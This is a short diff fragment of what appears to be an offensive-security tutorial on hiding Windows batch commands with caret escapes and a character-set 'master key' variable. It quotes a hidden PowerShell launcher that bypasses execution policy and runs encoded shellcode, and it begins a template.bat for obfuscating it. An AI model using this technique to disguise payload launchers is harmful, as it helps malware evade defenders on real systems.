@@ -28,7 +28,9 @@ The above string can be obfuscated using the **batch escape caracter** ^<br />
 - string command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
 
-- using one batch local variable to serve as our **master key** (varObj)
+- using one batch local variable to serve as our **master key** (varObj)<br />
+**template.bat**<br />
+
 
       @echo off
       SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
